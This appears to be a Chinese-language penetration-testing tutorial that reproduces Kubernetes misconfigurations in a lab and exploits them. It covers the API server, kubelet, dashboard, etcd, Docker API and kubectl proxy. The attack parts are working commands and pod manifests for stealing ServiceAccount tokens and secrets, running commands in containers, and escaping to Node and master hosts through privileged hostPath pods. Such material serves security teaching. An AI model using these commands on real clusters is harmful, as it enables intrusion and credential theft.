# 概述
K8s组件配置不当的问题，在容器权限获取和集群权限获取的阶段，往往能起到关键作用，以下列出了K8s集群中常见的端口服务，主要关注实战中常见的前六个组件，谈谈他们相关的配置不当问题：

1. <font style="color:rgb(36, 41, 47);">kube-apiserver: 6443, 8080</font>
2. <font style="color:rgb(36, 41, 47);">kubectl proxy: 8080, 8081</font>
3. <font style="color:rgb(36, 41, 47);">kubelet: 10250, 10255, 4149</font>
4. <font style="color:rgb(36, 41, 47);">dashboard: 30000</font>
5. <font style="color:rgb(36, 41, 47);">docker api: 2375</font>
6. <font style="color:rgb(36, 41, 47);">etcd: 2379, 2380</font>
7. <font style="color:rgb(36, 41, 47);">kube-controller-manager: 10252</font>
8. <font style="color:rgb(36, 41, 47);">kube-proxy: 10256, 31442</font>
9. <font style="color:rgb(36, 41, 47);">kube-scheduler: 10251</font>
10. <font style="color:rgb(36, 41, 47);">weave: 6781, 6782, 6783</font>
11. <font style="color:rgb(36, 41, 47);">kubeflow-dashboard: 8080</font>

# API server
API server一般部署在Master节点上，作为K8s集群的管理入口，获取能与API server通信的高权限账号凭证是K8s集群攻防中的重要节点。

## 8080非安全端口暴露
```plain
第一种配置不当，在Master节点上
cd /etc/kubernetes/manifests/，修改api-kube.conf，添加
- –-insecure-port=8080
- –-insecure-bind-address=0.0.0.0

第二种配置不当，在Master节点上
在/etc/kubernetes/manifests/kube-apiserver.yaml中添加配置

#API服务监听地址 
KUBE_API_ADDRESS="--insecure-bind-address=0.0.0.0" 
#API服务监听端口 
KUBE_API_PORT="--insecure-port=8080"
```

```plain
在暴露非安全端口的情况下，可以执行执行如下命令，相当于获取集权系统权限
kubectl -s "http://xxx:8080" get node
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665396801331-214f8f85-9e23-472a-857e-9d68f7c8cbce.png)

<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">v1.20后该端口被弃用，不存在该风险 </font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665396825153-fad04fb9-81a8-4870-aba7-b5f4e05e11b6.png)



## 6443端口高权限角色匿名访问
API server正常配置的情况下，在Master上访问

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665396890689-e94aeff3-227b-4a19-a57e-16c15417eaf9.png)

<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">如果在配置错误，将system:anonymous用户绑定到了cluster-admin用户组，那么匿名用户可以支配集群。 </font>

```plain
#在Master节点上执行
kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665397092699-6a2a0719-a417-47df-a231-c487826534c1.png)

```plain
#在任意Node工作节点上以匿名用户访问，为高权限
curl https://10.206.0.2:6443 -k
```

# ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665397156082-7dfa7dbc-3fd5-4fe7-9197-f28db87024cd.png)


### 获取secrets凭证
下边通过一个实战中的真实案例，说明如何通过6443端口高权限角色匿名访问，获取高权限ServiceAccount身份认证凭据，拿下集群控制权限的过程。

首先访问目标6443端口，未鉴权可匿名访问

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665397404199-dc6d54a4-fa6c-46da-abad-bccb45d27b1a.png)

```plain
#获取secrets身份认证凭据
https://10.160.27.4:6443/api/v1/secrets
https://10.160.27.4:6443/api/v1/namespaces/kube-system/secrets/
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665397443455-cf969037-bea1-4ef4-b82d-0cf4a535441c.png)

获取的token会有很多，大部分是系统自带的，有些没什么操作权限，需要找到那个运维创建的账号如admin等等。这里选择列表第一组token，下载到本地，base64解码在本地保存证书和token

```plain
kubectl --certificate-authority=ca.crt --server="https://10.160.27.4:6443" --token="eyJhbGciOiJSU..." get ns
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665397513981-1f8c4a6f-569f-4434-b36c-83feaa67adb7.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665397605664-6a88c576-e7ff-414d-bd25-5071b3d230f3.png)

或者可以使用cdk工具，在Pod容器上运行 

```plain
./cdk kcurl anonymous get "https://10.206.0.2:6443/api/v1/nodes" 
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665397965086-51236066-76f8-465d-ac20-37a118c7beec.png)

# kubelet
## 10250未授权
每一个 Node 节点都有一个 kubelet 服务，kubelet 监听了 10250，10248，10255 等端口。 

其中 10250 端口是 kubelet 与 API server进行通信的主要端口，通过该端口 kubelet 可以知道自己当前应该处理的任务，该端口在最新版 Kubernetes 是有鉴权的，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用 10250 提供的能力。

```plain
修改Node节点的kubelet配置文件
/var/lib/kubelet/config.yaml
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665418309436-d62845bb-07d4-4cac-bfa5-dd894f07cd35.png)

```plain
重启kubelet服务
systemctl daemon-reload
systemctl restart kubelet
```

在Master节点上，可以进行未授权访问

```plain
curl https://10.206.0.3:10250/pods -k
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665418473880-1290493d-5433-4caa-81fc-1bb82f944b0d.png)

新版的k8s认证方式authorization mode默认为webhook,需要 Kubelet 通过 API Server 进行授权。所以如果只是将authentication的anonymous改为true也无法利用，出现如下报错：

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665418500147-20b91ca4-a03e-4990-9d87-70f71de85f7a.png)

> 如果想在K8s容器中攻击当前节点的kubelet，一般可以直接使用docker0网桥的ip地址：172.17.0.1。图演示了在一个 Pod 中访问当前节点 kubelet 的 10250 端口：
>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665398310851-e0291123-cc85-4cf2-94a8-96794f991198.png)



### 执行容器命令
想要在容器里执行命令的话，我们需要首先确定namespace、pod_name、container_name这几个参数来确认容器的位置

+ metadata.namespace 下的值为 namespace 
+ metadata.name下的值为 pod_name 
+ spec.containers下的 name 值为 container_name 



未授权获取Pod信息后，寻找对应信息

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665418933136-c3a91d92-05b1-4fa2-be74-0ac42921d8e0.png)

 获取Pod上容器权限

```plain
curl https://10.206.0.3:10250/run/default/my-nginx-5b56ccd65f-5vwwn/my-nginx -k -d "cmd=ls"
```

# ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665419131904-cd2f0e90-05a6-443c-9199-40da025fe4cf.png)
### <font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">寻找特定权限容器</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">比如可以通过检索securityContext字段快速找到特权容器</font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665419195438-ab0478a1-d89e-4f0a-9bbb-4bde02a361e5.png)

### 读取ServiceAccount token
读取容器中的ServiceAccount的token，获取对应ServiceAccount权限，不同的ServiceAccount 拥有不同的集群权限，所以需要尝试寻找高权限的token

```plain
curl https://10.206.0.3:10250/run/default/my-nginx-5b56ccd65f-5vwwn/my-nginx -k -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665419221216-0f33916d-37e1-40d2-b63e-e00a326661db.png)

通过Service Account token可以与API server进行通信，参考[这里](https://m-king.yuque.com/epgybr/xtmnwr/nnn5rm#KVFP3)

## 10255只读端口未授权
由于这里 10250 鉴权当前的 Kubernetes 设计是默认安全的，所以 10255 的开放就可能更加容易在红蓝对抗中起到至关重要的作用。10255 本身为只读端口，虽然开放之后默认不存在鉴权能力，无法直接利用在容器中执行命令，但是可以获取环境变量 ENV、主进程 CMDLINE 等信息，里面包含密码和秘钥等敏感信息的概率是很高的，可以快速帮我们在对抗中打开局面。

```plain
在Node节点上修改配置文件
/var/lib/kubelet/kubeadm-flags.env

添加 --read-only-port=10255


重启kubelet
systemctl daemon-reload
systemctl restart kubelet
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665420174477-29472757-9585-4f96-b71f-11f46ea735d0.png)

```plain
#访问10255端口进行未授权访问
curl http://10.206.0.3:10255/pods -k
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665420190081-4b4b9dd7-4aba-47fa-b078-f8ab2b0f7b79.png)

除了常见的/pods接口，还有如下接口，可用于敏感信息收集：

+ /metrics
+ /metrics/cadvisor
+ /metrics/resource/v1alpha1
+ /metrics/probes
+ /spec/
+ /stats/
+ /logs/



# dashboard
<font style="color:rgb(36, 41, 47);">dashboard 是 Kubernetes 官方推出的控制 Kubernetes 的图形化界面，在 Kubernetes 配置不当导致 dashboard 未授权访问漏洞的情况下，通过 dashboard 我们可以控制整个集群。</font>

<font style="color:rgb(36, 41, 47);"></font>

## <font style="color:rgb(36, 41, 47);">Skip登陆高权限账号</font>
<font style="color:rgb(36, 41, 47);">在 dashboard 中默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录进入 dashboard</font>

```plain
#首先在Master节点上部署dashboard
kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.6.1/aio/deploy/recommended.yaml
```

# ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665420744658-8a3f9760-0904-4119-9a90-f5e5504a4571.png)
```plain
#修改添加enable-skip-login 
kubectl apply -f recommended.yaml 
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665420799428-0e29caae-c34a-4967-b757-422d71928fad.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665420804205-91eaffe2-d8be-4a7f-ad04-10dcf9503f70.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665420812921-05e05305-5655-4970-b334-b4c592e6a01e.png)

<font style="color:rgb(36, 41, 47);">然而通过点击 Skip 进入 dashboard 默认是没有操作集群的权限的，因为 Kubernetes 使用 RBAC(Role-based access control) 机制进行身份认证和权限管理，不同的 serviceaccount 拥有不同的集群权限。</font>

<font style="color:rgb(36, 41, 47);">我们点击 Skip 进入 dashboard 实际上使用的是 Kubernetes-dashboard 这个 ServiceAccount，如果此时该 ServiceAccount 没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。</font>

```plain
#修改recommended.yaml，为ServiceAccount绑定 cluster-admin 这个 ClusterRole
kubectl apply -f recommended.yaml
```



![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665421221611-a3edfcae-b646-4630-b7cb-785963a1d98b.png)

```plain
#成功添加绑定
kubectl get clusterrolebinding --all-namespaces 
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665421614197-8b627850-0aec-4577-bb0d-4d5ecfff42a8.png)

此时可以正常使用dashboard功能，<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">管理Pods、CronJobs等 </font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665421667865-67fc43e1-9763-40b8-b93d-6edbb3da3aef.png)

如何

# 
# etcd
etcd 被广泛用于存储分布式系统或机器集群数据，其默认监听了 2379 等端口，如果 2379 端口暴露到公网，可能造成敏感信息泄露，本文我们主要讨论 Kubernetes 由于配置错误导致 etcd 未授权访问的情况。Kubernetes 默认使用了 etcd v3 来存储数据，如果我们能够控制 Kubernetes etcd 服务，也就拥有了整个集群的控制权。

```plain
#工具下载etcdctl
https://github.com/etcd-io/etcd/releases/tag/v3.5.5
```

## 使用etcdctl
默认情况下，访问Master节点的etcd服务，2379端口是需要授权的

```plain
etcdctl --endpoints=https://10.206.0.2:2379 get / --prefix --keys-only
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665422157578-6cb2a339-5a6a-4478-83c6-85bbd310ad3d.png)

在Master节点上以访问etcd服务，需要配置证书

```plain
#使用环境变量
export ETCDCTL_API=3
export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt
export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt
export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
etcdctl endpoint health

#或者使用手工设置命令参数
etcdctl --insecure-skip-tls-verify --insecure-transport=true --endpoints=https://172.16.0.112:2379 --cacert=ca.pem --key=etcd-client-key.pem --cert=etcd-client.pem endpoint healthv
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665422980565-303f2d2d-0200-4d73-888c-575bdc912faa.png)

### 获取Secrets凭证
如下演示如何通过etcd获取凭证，在未授权场景下，需要指定参数

--endpoints=http://10.206.0.2:2379



获取云产品Access Key

```plain
etcdctl get / --prefix --keys-only | grep /secrets/
etcdctl get /registry/secrets/default/acr-credential-518dfd1883737c2a6bde99ed6fee583c
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665423156674-4ea4c709-9424-45ad-bdd4-bd12f8288b4d.png)

获取ServiceAccount 登陆凭证

```plain
etcdctl get / --prefix --keys-only | grep /secrets/kube-system/clusterrole
etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-ckt8q
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665423370619-68881ab3-4550-4654-ad51-6b621f0ece4a.png)

通过Service Account token可以与API server进行通信，参考[这里](https://m-king.yuque.com/epgybr/xtmnwr/nnn5rm#KVFP3)

## 2379未授权
```plain
#修改Master节点上配置文件
/etc/kubernetes/manifests/etcd.yaml

#重启kubelet服务
systemctl daemon-reload
systemctl restart kubelet
```

> 复现的时候翻车了，修改完配置文件后，把API server整崩溃了，根据网上的解决方案，把etcd的snap文件删了，然后发现数据都没了；还要在Master节点上 kill etcd进程；然后把Master节点跟Node节点的kubelet服务重启
>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665423897418-73828539-2b5b-44e6-b851-e1bd43f135c4.png)

```plain
#在Node工作节点上执行，未授权访问etcd服务
etcdctl --endpoints=http://10.206.0.2:2379 get / --prefix --keys-only | grep /secrets/
etcdctl --endpoints=http://10.206.0.2:2379 get /registry/secrets/default/default-token-shlxc
```

 ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665423946174-928ab793-3b60-41f5-a610-d231cc465b0f.png)

```plain
#获取所有容器信息
curl http://10.206.0.3:2375/containers/json
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665424668888-48456cc2-09e6-4681-a002-f2563d441cbc.png)



# docker api
Docker Engine API 是 Docker 提供的基于 HTTP 协议的用于 Docker 客户端与 Docker 守护进程交互的 API，Docker daemon 接收来自 Docker Engine API 的请求并处理，Docker daemon 默认监听 2375 端口且未鉴权，我们可以利用 API 来完成 Docker 客户端能做的所有事情。 

Docker daemon 支持三种不同类型的 socket: unix, tcp, fd。默认情况下，Docker daemon 监听在 unix:///var/run/docker.sock，开发者可以通过多种方式打开 tcp socket

## 2375未授权
```plain
#在Node工作节点上修改
/usr/lib/systemd/system/docker.service

#重启docker
systemctl daemon-reload
systemctl restart docker
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665424475354-a14f4762-8207-4665-8a0a-865532ad951f.png)

```plain
#在任意Node节点上执行
docker -H tcp://10.206.0.3:2375 ps
获取了节点docker的控制权限
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665424508017-ea6ac8d4-947e-4358-adc2-cf6417917a50.png)

### 未授权判断
```plain
curl http://10.206.0.3:2375/info | grep ContainersRunning
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665424603847-443a5929-b1bf-4f0d-a129-673957050278.png)

# kube-proxy
<font style="color:rgb(36, 41, 47);">kubectl proxy 这个子命令大家可能遇到比较少，这里单独介绍一下；由于上述几个组件的安全问题较为常见和出名，且在目前开源分支里它们在鉴权这个方面都是默认安全的，所以直接出现问题的可能性较小，企业在内外网也都收敛得不错；此时 kubectl proxy 这个子命令反而是另一个常见且蠕虫利用起来非常简单粗暴的问题。</font>

简单来说，当运维人员需要某个环境暴露端口或者IP时，会用到Kubectl Proxy。

## 未授权访问
使用kubectl proxy命令就可以使API server监听在本地的8080端口上： 

```plain
kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8080

#通过内网或者外网进行访问
kubectl -s http://10.206.0.2:8080 get pods -n kube-system
kubectl -s http://118.195.245.144:8080 get pods -n kube-system 
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665424875249-4568418f-6f33-4b51-b605-174051168d97.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665424941823-48262712-f60f-45b6-89f9-de0d32eaa0c6.png)

```plain
#此时也可以直接调试Pod容器上的服务
curl -i http://localhost:8080/api/v1/namespaces/default/pods/my-nginx-5b56ccd65f-dzxxj:80/proxy/
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665425101928-31e26897-f8e6-49fb-ba10-304696fbb5f5.png)



# 组件后渗透
在利用各组件配置不当问题，有如下后渗透思路：

+ API server
    - 部署恶意容器逃逸
+ kubelet
    - 控制特权容器
    - 寻找ServiceAccount登陆凭证（高权ServiceAccount/RBAC滥用利用）
+ dashboard
    -  部署恶意容器逃逸
+ ETCD
    - 获取secrets凭证（云厂商AK/寻找ServiceAccount登陆凭证）
+ docker api
    - 部署恶意容器逃逸



回看之前从漏洞视角描述的K8s攻击思维导图，利用K8s组件配置不当问题在后渗透时，主要会涉及到部署恶意容器逃逸、RBAC滥用利用等知识，这部分本应该在讲容器逃逸/提权时进行分享，但是感觉在此处结合K8s组件配置不当的问题，当作K8s集群渗透的后渗透阶段分享，更为合适。



![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665457943931-da6be82b-33ba-4f22-b18f-607438a429ca.png)



## 手工构造kubectl请求
通过K8s组件配置不当问题，经常可获取敏感登陆凭证，可使用kubectl与API server进行通信。

某些情况下我们攻破的K8s容器是一个缩减的容器环境，没有kubectl curl等常见命令，此时与通信的方法API server有三种：

+ 植入kubectl
+ 代理流量
+ 手工构造http请求API server通信



这里说明如何手工构造http请求与API server通信，首先在本地获取请求

```plain
#获取URL和POST DATA
kubectl  create -f simple-pod.yaml -v=8
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665394463721-5302471e-76e9-4c92-8aa8-f2c51094f733.png)

除此之外针对yaml转json还可以使用kubectl create -f ubuntu.yaml --edit -o json 直接生成post data。

```plain
kubectl create -f simple-pod.yaml --edit -o json
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665394488651-40c6ac78-8da0-49f4-b893-a7acef59bd81.png)

然后使用cdk工具进行重放

```plain
./cdk kcurl (anonymous|default|<token-path>) <method> <url> [<data>]
当前Pod不存在访问API server权限，返回403
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665394565588-91164778-521c-4bc8-b29c-8163454eec06.png)

## 部署恶意容器逃逸
### API server
在获取集群控制权限后，使用kubeclt命令获取本地镜像

```plain
#获取本地镜像
kubectl get pods --all-namespaces --insecure-skip-tls-verify=true -o jsonpath="{..image}" |tr -s '[[:space:]]' '\n' |sort |uniq -c
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460041860-1dace0b2-15b7-4853-a86e-cdf88a33515f.png)

发现存在nginx镜像，使用该镜像创建恶意Pod

```plain
#pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-444
spec:
  containers:
  - name: test-444
    image: nginx
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

```plain
#在default命名空间中创建Pod
kubectl apply -f pod.yaml -n default --insecure-skip-tls-verify=true
#进入容器中
kubectl exec -it test-444 bash -n default --insecure-skip-tls-verify=true
#切换bash，逃逸成功
cd /host
chroot ./ bash
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460172409-6a245870-7eeb-440f-bce7-ad84dc03ad9c.png)

成功逃逸到宿主机Node节点上，还可以挂载更多权限与目录，利用

```plain
#attack2.yaml
apiVersion: v1
kind: Pod
metadata:
  name: neartest
  labels:
    team: tencent-redteam
    creator: neargle
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  nodeSelector:
    #kubernetes,io/hostname需先查看pod所在的节点进行修改
    #kubectl get pods -o wide
    kubernetes.io/hostname: VM-0-3-centos
  containers:
  - name: trpc
    image: "alpine"
    #imagePullPolicy: "Never"
    securityContext:
      privileged: true
      capabilities:
        add:
        - SYS_ADMIN
    command: ["/bin/sh","-c","tail -f /dev/null"]
    volumeMounts:
    - mountPath: /host/dev
      name: dev
    - mountPath: /host/proc
      name: proc
    - mountPath: /host/sys
      name: sys
    - mountPath: /near_sandbox
      name: rootfs
  volumes:
    - name: proc
      hostPath:
        path: /proc
    - name: dev
      hostPath:
        path: /dev
    - name: sys
      hostPath:
        path: /sys
    - name: rootfs
      hostPath:
        path: /
```

成功逃逸到宿主机10.206.0.3上，执行ifconfig命令

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665632056634-9a8546d4-1363-466e-98b3-7b311cccd734.png)

### Dashboard
进入Dashboard后台，创建Pod![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460248597-4472b223-174a-49d7-86c0-1fae4f5ddbda.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460329020-b5289d7a-23fc-468c-95b5-7afa7b6afc30.png)

```plain
cd /host && chroot ./ bash
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460352518-25bcf87e-1413-488c-995c-fd05889b4e0b.png)

成功逃逸到宿主机Node节点上，类似API server利用方式，还可以挂载更多权限和目录。

### docker api
```plain
#docker创建高权pod 进行逃逸
docker -H tcp://10.206.0.3:2375 run -d -it --name neartest_Kubernetes_hashsubix -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/near_sandbox" --network=host --privileged=true --cap-add=ALL alpine:latest /bin/sh -c tail -f /dev/null
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460454945-0a315868-5cce-42e4-9f34-4028184b99d8.png)

```plain
docker -H tcp://10.206.0.3:2375 exec -it 84b944c8ab71 sh
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460473154-c6bf3b70-5462-4252-8e0f-6ab1ee607868.png)

```plain
cd /near_sandbox/
chroot ./ bash
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665460488968-4c46e3d2-87e5-44da-9c7a-7e1f69e1705b.png)

### 逃逸到特定节点
#### 节点亲和性
<font style="color:rgb(51, 51, 51);">一般情况下我们部署的 Pod 是通过集群的自动调度策略来选择节点的，默认情况下调度器考虑的是资源足够，并且负载尽量平均，但是有的时候我们希望Pod被分配到特定Node节点。使用NodeSelector可以将Pod与对应标签的Node节点进行匹配，如下示例，可以将Pod部署到hostname为</font>VM-0-3-centos的Node工作节点，从而逃逸特定Node节点

```plain
#test.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  nodeSelector:
    #kubernetes,io/hostname需先查看pod所在的节点进行修改
    #kubectl get pods -o wide
    kubernetes.io/hostname: VM-0-3-centos
  containers:
  - name: trpc
    image: "alpine"
    #imagePullPolicy: "Never"
    securityContext:
      privileged: true
      capabilities:
        add:
        - SYS_ADMIN
```



#### 污点与容忍度
<font style="color:rgb(36, 41, 47);">污点是K8s高级调度的特性，用于限制哪些Pod可以被调度到某一个节点。一般主节点包含一个污点，这个污点是阻止Pod调度到主节点上面，除非有Pod能容忍这个污点。而通常容忍这个污点的 Pod都是系统级别的Pod，例如kube-system，利用该特性可以逃逸到Master节点</font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665482408439-b25e1c3a-53ee-42e8-9413-99d87e3698f6.png)

```plain
#查看Master节点污点
kubectl describe node vm-0-2-centos | grep "taint" -i
#查看Node工作节点
kubectl describe node vm-0-3-centos | grep "taint" -i

# 为节点添加污点
kubectl taint nodes vm-0-3-centos key1=value1:NoSchedule
#查看Node工作节点
kubectl describe node vm-0-3-centos | grep "taint" -i

# 为节点去除污点
kubectl taint nodes vm-0-3-centos key1=value1:NoSchedule-
#查看Node工作节点
kubectl describe node vm-0-3-centos | grep "taint" -i
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665482429358-3a84633b-a6fc-446f-b65b-f7a1bfb8cfe2.png)

```plain
#为Node添加污点后，无法正常创建Pod，因为Pod不具备容忍度
kubectl taint nodes vm-0-3-centos key1=value1:NoSchedule
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665482493461-e24b387f-ffe4-4ba9-b35d-8d3d176e7239.png)

```plain
#创建一个具备容忍度的Pod，使其被创建时只会被vm-0-3-centos节点调度，因为其他节点不具备该污点：
#toleration2.yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx
  labels:
    env: test
spec:
  containers:
  - name: nginx
    image: nginx
    imagePullPolicy: IfNotPresent
  tolerations:
  - key: "key1"
    operator: "Equal"
    value: "value1"
    effect: "NoSchedule"

operator属性的默认值是Equal，这表示键的值必须与value属性的值一致。
而如果operator是Exists的话则容忍度不能指定value，而污点上的任意值都能够匹配该污点（前提是key匹配）。
```

成功在具有污点的Node工作节点上创建Pod

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665482711325-79d98786-432a-47e9-a5ed-025bbf2290b0.png)

利用污点与容忍性，部署恶意Pod逃逸到Master节点上

```plain
#查看Master节点上的污点
kubectl get nodes
kubectl describe node vm-0-2-centos | grep "taint" -i
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665482817005-5309820c-da9b-44ed-ae9a-6df1482a27c3.png)

```plain
#创建能容忍Master节点污点的恶意Pod
#pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-555
spec:
  tolerations:
    - key: node-role.kubernetes.io/master
      operator: Exists
      effect: NoSchedule
  containers:
  - name: test-555
    image: nginx
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

创建成功

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665482866512-7e360e28-b6e1-4c3e-9a53-be00bfa76968.png)

```plain
#切换bash，逃逸成功到Master主机上
cd /host
chroot ./ bash
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665482888275-d548429d-6003-47b1-abd1-3f5acd7a8c2e.png)



## RBAC滥用
<font style="color:rgb(34, 34, 34);">基于角色（Role）的访问控制（RBAC）是一种基于不同用户的角色来调节控制对计算机或网络资源的访问的方法。在RBAC滥用时，特定用户拥有了特殊权限，进一步利用可获取高权限ServiceAccount账号。</font>

<font style="color:rgb(34, 34, 34);">Role 用于设置某个namespace中的访问权限，相对的，ClusterRole用于设置集群作用域的访问权限，因为 K8s 中对象要么是名字空间作用域的，要么是集群作用域的，不可两者兼具。角色绑定（Role Binding）是将角色（Role/ClusterRole）中定义的权限赋予一个或者一组用户，RoleBinding 在指定的名字空间中执行授权，而 ClusterRoleBinding 在集群范围执行授权。一个 RoleBinding 可以引用同一的名字空间中的任何 Role。 或者，一个 RoleBinding 可以引用某 ClusterRole 并将该 ClusterRole 绑定到 RoleBinding 所在的名字空间。 如果你希望将某 ClusterRole 绑定到集群中所有名字空间，你要使用 ClusterRoleBinding。</font>

<font style="color:rgb(34, 34, 34);">以上提到了Role、ClusterRole、RoleBinding、ClusterRoleBinding，下边通过实际操作加深下理解。</font>

### <font style="color:rgb(34, 34, 34);">创建RoleBinding</font>
```plain
#首先创建kube-system名称空间下的ServiceAccount，叫hx-sa
kubectl create sa hx-sa -n kube-system

#创建Role，role.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: hx-sa-role
  namespace: kube-system
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]

#创建RoleBinding，rolebinding.yaml
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa-rolebinding
  namespace: kube-system
subjects:
- kind: ServiceAccount
  name: hx-sa
  namespace: kube-system
roleRef:
  kind: Role
  name: hx-sa-role
  apiGroup: rbac.authorization.k8s.io

kubectl get secret -n kube-system |grep hx-sa
kubectl get secret hx-sa-token-qcnll -o jsonpath={.data.token} -n kube-system |base64 -d
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665469079422-94ae7049-31f4-4ed8-9d6b-f7c90d7537ec.png)

获取hx-sa ServiceAccount的token后，发现可以列举kube-system名称空间下的deployment，无法列举default名称空间下的deployment  
![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665469279806-570334ac-c41f-4e58-acdb-3c48274e3ba0.png)

### 创建ClusterRoleBinding
```plain
#首先创建kube-system名称空间下的ServiceAccount，叫hx-sa2
kubectl create sa hx-sa2 -n kube-system

#clusterrolebinding.yaml
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: hx-sa2-clusterrolebinding
subjects:
- kind: ServiceAccount
  name: hx-sa2
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io

kubectl get secret -n kube-system |grep hx-sa2
kubectl get secret hx-sa2-token-zg9t9 -o jsonpath={.data.token} -n kube-system |base64 -d
```

获取hx-sa2 ServiceAccount的token后，发现可以列举所有名称空间，因为cluster-admin为高权限的ClusterRole角色

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665469609175-59a6692a-df85-4a62-9b70-070cd88e7493.png)

### Create pods
![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665471501268-adaf8671-f029-409f-a677-4c1ede43addd.png)

如果获取的ServiceAccount token拥有create pod权限，利用方式与使用API server部署恶意容器逃逸一致，不再赘述

### List secrets
